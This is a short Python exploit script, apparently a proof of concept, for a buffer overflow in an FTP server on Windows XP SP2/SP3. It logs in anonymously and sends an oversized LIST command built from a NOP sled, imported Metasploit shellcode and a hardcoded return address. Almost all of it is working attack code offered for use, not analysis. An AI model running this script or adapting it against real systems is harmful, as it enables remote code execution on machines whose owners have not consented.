#!/usr/bin/python
import socket,sys

# Tested on XP Pro SP2 [ Eng ] and XP Pro SP3 [ Eng ]



import socket
from payload import buf
import sys
def shell_attack(target_machine, target_port):
 
    target = target_machine
    port = target_port

    # Buffer needed -> 272 bytes
    # Metasploit Shellcode PoC - Calc.exe [ 228 bytes ] [ shikata_ga_nai - 1 iteration ] [ badchars \x00\x0a\x2f\x5c ]

   

    nopsled = b"\x90" * 40
    ret = b"\x10\x3B\x88\00" # MAGIC RET 00883B10 [ CALL EDI ]
    payload = nopsled + buf + ret 

   
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        s.connect((target, port))
        
    except:
        print("[!] Connection failed!")
        sys.exit(0)

    s.recv(1024)

    # Targetting default user 'anonymous' on the target
    s.send(b'USER anonymous\r\n')
    s.recv(1024)
    s.send(b'PASS anonymous\r\n')
    s.recv(1024)
   
    s.send(b'LIST ' + payload + b'\r\n')
    s.recv(1024)

    

    try:
        s.recv(1024)

    except:
        print("[+] +++Exploit Successful+++ ^_^")

    s.close()